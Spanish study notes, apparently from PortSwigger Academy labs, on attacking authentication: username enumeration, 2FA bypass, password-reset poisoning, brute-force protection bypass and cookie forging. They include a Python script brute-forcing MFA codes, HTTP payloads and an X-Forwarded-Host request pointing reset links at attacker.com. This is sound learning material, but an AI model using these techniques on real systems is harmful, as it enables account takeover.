
----------
# Definición

>Las **authentication vulnerabilities** (vulnerabilidades de autenticación) son debilidades en los mecanismos que un sistema utiliza para verificar la identidad de un usuario, dispositivo o servicio. Estas fallas permiten que atacantes eludan, manipulen o rompan el proceso de autenticación para obtener acceso no autorizado a recursos, datos o funcionalidades.

Algunos ejemplos comunes son:

- *Contraseñas débiles o predecibles* que pueden adivinarse fácilmente.
    
- *Almacenamiento inseguro de credenciales* (p. ej., contraseñas sin hash o con algoritmos débiles).
    
- *Fallas en la gestión de sesiones*, como tokens predecibles o que no expiran.
    
- *Implementaciones incorrectas de multifactor* que pueden ser omitidas.
    
- *Brute force sin protección*, cuando no existen límites de intentos de inicio de sesión.

------------
# Username enumeration

## Via different responses

La web devuelve una respuesta diferente para cuando un usuario es correcto o no en el inicio de sesión. Por ejemplo, cuando no es correcto, devuelve 'Incorrect username', pero cuando sí lo es devuelve 'Incorrect password'.

## Via subtly different responses

La web puede estar devolviendo aparentemente una cadena genérica cuando las credenciales son incorrectas: 'Incorrect username or password.'.

No obstante, puede darse el caso que al ser el usuario correcto, devuelva: 'Incorrect username or password'.

Nótese la diferencia entre las dos cadenas: la primera tiene un punto final mientras que la segunda no.

## Via response timing

El registro devuelve el mismo mensaje para cuando el usuario es correcto como para cuando no lo es. Sin embargo, si el usuario es correcto, se hace una comparativa de la contraseña introducida con la almacenada en la base de datos para ese usuario. 

Si está mal implementado, al introducir una contraseña muy larga, el servidor tarda más tiempo en comparar las cadenas y devolver la respuesta HTTP.

## Via account lock

Tras varios intentos fallidos de inicio de sesión con un usuario registrado, el servidor bloquea el acceso a esa cuenta por un tiempo determinado. Además, no realiza ningún bloqueo sobre usuarios no existentes. De esta manera, si se consigue un mensaje de bloqueo de inicio, el usuario existe.

------------
# 2FA (Second Factor Authentication)

## Simple bypass

Al iniciar sesión, la página solicita un código de verificación que llega al correo del usuario. Sin embargo, se puede navegar a los recursos como el usuario ya autenticado sin necesidad de introducir ese código.

## Broken logic

El inicio de sesión envía una petición al endpoint `/login`:

``` http
POST /login HTTP/2
Host: vulnerable.com
Cookie: session=MPbu2q1gY0FYLs2Z4JaIhzaHgnmvd01l

username=wiener&password=peter
```

El servidor asigna una cookie ``verify`` y redirige a `/login2`. La petición a ese endpoint es:

``` http
GET /login2 HTTP/2
Host: vulnerable.com
Cookie: session=MPbu2q1gY0FYLs2Z4JaIhzaHgnmvd01l; verify=wiener
```

Este endpoint lee la cookie verify y envía un correo al usuario con el código de seguridad de 4 dígitos.

Finalmente, para enviar el código se realiza la siguiente petición:

``` http
POST /login2 HTTP/2
Host: vulnerable.com
Cookie: session=MPbu2q1gY0FYLs2Z4JaIhzaHgnmvd01l; verify=wiener

mfa-code=1234
```

En este esquema de autenticación se encuentra una vulnerabilidad, y es que al enviar la primera petición y posteriormente cambiar la cookie ``verify`` por el valor de otro usuario existente, se puede hacer que el servidor envíe un código a ese usuario.

Después, como el código no es complejo, y no hay ninguna protección contra fuerza bruta, se pueden enviar peticiones probando todos los posibles códigos hasta dar con el correcto y recibir la cookie de sesión para ese usuario.

## Brute-force attack

>Esta opción solo es viable si el código del 2FA no tiene demasiadas combinaciones.

Aprovechando que el código de verificación se mantiene vigente durante un tiempo, independientemente de las peticiones e intentos de inicio de sesión, se puede tratar de hacer fuerza bruta en la petición de verificación probando por cada posible combinación.

Sin embargo, si solo se permite un intento de verificación por intento de inicio; o sea, cada vez que se falla hay que volver a introducir las credenciales; se puede jugar con macros.

Para construir la macro desde Burpsuite, hay que ir a `Burp > Settings > Sessions`. Aquí hay que añadir una nueva *Session handling rule*. En scope se puede introducir la opción de cualquier URL para evitar complicaciones, y luego en la regla se añade una macro. En esa macro, se añaden las peticiones previas a la petición en la que se pretende hacer fuerza bruta. De esta forma, cada petición que se lance irá precedida por la macro previamente configurada.

*\*Nota*: Este ataque no garantiza encontrar el código con un solo lanzamiento del mismo, ya que el código puede cambiar a mitad de ejecución, por uno que ya se ha probado. Por lo que es necesario, en ocasiones, lanzar el ataque varias veces.

Una **alternativa** a Burpsuite es lanzar las peticiones manualmente. Como en este script de python:

``` python
#! /usr/bin/python3

import sys
import signal
import requests
from bs4 import BeautifulSoup
from pwn import log

# Ctrl + C
def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Variables globales
url = "https://0a3a006204b784f982141a9d004300c9.web-security-academy.net"
credentials = {
    'username': "carlos",
    'password': "montoya"
}

# Generar combinaciones de pines
def get_pins():
    for i in range(10000):
        yield f"{i:04d}"

# Obtener cookie de sesion valida
def get_session_cookie(session):
    r = session.get(url)

# Obtener csrf-token
def get_csrf(session, path="/login"):
    r = session.get(url + path)

    soup = BeautifulSoup(r.text, "html.parser")
    csrf = soup.find("input", {"name": "csrf"}).get("value")

    return csrf

# Obtener sesion para las credenciales
def get_user_session(session, csrf):
    data = {
        'csrf': csrf,
        'username': credentials['username'],
        'password': credentials['password']
    }

    r = session.post(url + "/login", data=data, allow_redirects=False)

# Comprobar pin de verificacion
def check_pin(session, csrf, pin):
    data = {
        'csrf': csrf,
        'mfa-code': pin
    }

    r = session.post(url + "/login2", data=data, allow_redirects=False)

    if r.status_code == 302:
        cookie = r.headers.get("Set-Cookie")
        print("Cookie de sesion para el usuario " + credentials['username'] + ": " + cookie)
        sys.exit(0)

# Control de flujo
if __name__ == "__main__":
    p = log.progress("Probando codigo")

    session = requests.Session()
    get_session_cookie(session)
    for pin in get_pins():
        p.status(pin)
        csrf = get_csrf(session, "/login")
        get_user_session(session, csrf)

        csrf = get_csrf(session, "/login2")
        check_pin(session, csrf, pin)
```

-----------
# Password reset

## Broken logic

La funcionalidad de reseteo de contraseña envía un correo con un token para acceder al recurso de reinicio de contraseña. En este recurso, se introduce la contraseña nueva y se confirma el cambio. Pero en la petición que se envía, se arrastra el usuario que está cambiando la contraseña. Por tanto, si se cambia el valor del username, se puede lograr cambiar la contraseña de cualquier usuario.

## Poisoning via Middleware

La funcionalidad envía un correo con una URL con token para cambiar la contraseña. Esta URL se construye en el servidor de manera dinámica de la siguiente forma:

- `http://{host}/forgot-password?temp-forgot-password-token={token_aleatorio}` (utiliza {host} porque el middleware gestiona varios hosts)

Sin embargo, confía completamente en la cabecera `X-Forwarded-Host` para volcarlo en {host}.

De esta manera, realizando la siguiente petición:

``` http
POST /forgot-password HTTP/2
Host: 0acb00260469185781ad20d8003400db.web-security-academy.net
Cookie: session=dS0F6oyHunOAtSohYtq8kgmpnFvbHO9O
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Referer: https://0acb00260469185781ad20d8003400db.web-security-academy.net/forgot-password
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: https://0acb00260469185781ad20d8003400db.web-security-academy.net
X-Forwarded-Host: attacker.com

username=carlos
```

Le llegará un correo a carlos con el enlace: `http://attacker.com/temp-forgot-password-token=2lk5twrzvex9c1bv9wyvi3vuhgh6rdhi`.

Al clickar, hará una petición al dominio del atacante revelando el token para cambiar la contraseña.

Con este token, se puede cambiar la contraseña del usuario y acceder a su cuenta.

----------
# Brute-force protections

## IP block

>Tras varios intentos fallidos, el servidor bloquea la dirección IP durante un tiempo para que no realice más solicitudes de inicio de sesión.

### X-Forwarded-For header bypass

Si el servidor soporta la cabecera `X-Forwarded-For`, se puede tratar de realizar un IP spoofing, iterando por el rango de IPs a medida que se hacen peticiones.

- `X-Forwarded-For: 127.0.0.i`, i>0 && i<255

### Correct login refresh bypass

Es posible que al realizar un inicio de sesión con credenciales válidas, el contador de inicios incorrectos se reinicie. De esta manera, si se introducen credenciales correctas antes de sufrir el bloqueo, se evitan completamente las protecciones contra fuerza bruta.

*\*Nota*: es fundamental que las peticiones se realicen de manera secuencial.

### Multiple credentials per request

Si las credenciales se envían en un JSON como:

``` json
{
	"username": "josmo",
	"password": "test"
}
```

Si la aplicación está muy mal montada, puede que acepte un array en el campo de contraseñas. Si es el caso, si la contraseña correcta se encuentra en ese array, el inicio se toma como válido.

Por tanto, si las credenciales de josmo son `josmo:Josmo123`:

``` json
{
	"username": "josmo",
	"password": [
		"test",
		"probando",
		"huelebicho69",
		"Josmo123",
		"polletePrime"
	]
}
```

Esta data enviada dará como resultado el inicio de sesión satisfactorio en la cuenta de josmo.

---------
# Stay-logged-in cookie brute-force

En ocasiones, las cookies que emplean ciertas páginas para mantener la sesión iniciada pueden llegar a falsificarse si no son aleatorias y se conoce como están construidas.

En el ejemplo, para el usuario con credenciales `wiener:peter`, la stay-logged-in cookie es:

- `stay-logged-in=d2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw`

Se puede ver que es una cadena en base64. Decodificándola se queda en:

- `wiener:51dc30ddc473d43a6011e9ebba6ca770`

Y en esta cadena parece que están las credenciales del usuario, pero con la contraseña cifrada (seguramente en md5 por la longitud). Como se conoce la contraseña a priori, se prueba a codificarla a ver si coincide con la cadena de la cookie.

- `peter` -- md5 --> `51dc30ddc473d43a6011e9ebba6ca770`

De esta manera, y con este caso concreto de cookie, se podría conseguir hacer fuerza bruta a la contraseña de un usuario esquivando posibles protecciones del panel de login.

------------
# Password brute-force via password change

La funcionalidad de cambiar la contraseña, si está mal diseñada, se puede aprovechar para hacer fuerza bruta sobre la contraseña de otro usuario.

En el ejemplo, la funcionalidad requiere la contraseña actual y dos veces la nueva contraseña. Y en la petición, se manda un parámetro con el nombre de usuario. Modificando este último se puede conseguir realizar la petición para otro usuario.

Luego la funcionalidad devuelve un error cuando las contraseñas nuevas no coinciden, y otro error distinto para cuando la contraseña actual no es correcta.

Por tanto, se pueden introducir unos valores diferentes en los campos de nueva contraseña, y hacer fuerza bruta en el campo de contraseña. De este modo, si la contraseña es incorrecta lanzará el error de que la contraseña no es correcta; pero si se acierta la contraseña, el error que devuelve es el de la nueva credencial. En este último caso se habría encontrado la clave.